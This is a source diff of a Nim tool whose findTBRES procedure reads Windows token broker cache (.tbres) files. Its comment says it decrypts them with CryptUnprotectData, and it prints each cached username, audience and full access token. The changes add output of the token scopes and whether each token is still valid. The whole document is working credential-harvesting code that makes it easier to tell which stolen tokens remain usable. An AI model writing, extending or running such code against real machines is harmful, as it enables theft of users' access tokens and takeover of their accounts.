@@ -1,8 +1,8 @@
 import os
-import std/[base64, json, sequtils, streams, strutils, tables]
+import std/[base64, json, sequtils, streams, strutils, tables, times]
 
-import constants
-import utils
+import ../constants
+import ../utils
 
 proc readTBRESStr(stream: Stream): string =
   discard stream.readInt32() # Skip 0xC type
@@ -19,9 +19,10 @@ proc findTBRES*() : void =
 
   # Get all files in cache and decrypt them using CryptUnprotectData
   var files = toSeq(walkFiles(cache_path & "\\*.tbres"))
+  echo $files.len
   for file in files:
     var tbres = try: readFile(file)
-                except: echo "WOW"; continue # Skip if can't read file
+                except: echo "Could not read " & file; continue # Skip if can't read file
 
     var cleaned_json = multiReplace(tbres, ("\x00", ""))
     var json = parseJson(cleaned_json)
@@ -46,8 +47,12 @@ proc findTBRES*() : void =
       # Base64 decode second split of token on "." and parse as JSON
       var token_json = parseJson(decode(token.split(".")[1]))
       var audience = token_json["aud"].getStr()
+      var isValid = token_json["exp"].getInt() > getTime().toUnix
+      var valid_Str = if isValid: green("True") else: "False"
 
-      echo ("Found: " & file).green.bold
+      echo ("Found: " & file).green
       echo "\tUsername: " & username
       echo "\tAudience: " & WELL_KNOWN_APPIDS.getOrDefault(audience, audience)
+      echo "\tScopes: " & token_json["scp"].getStr()
+      echo "\tValid: " & valid_Str
       echo "\tToken: " & token & "\n"
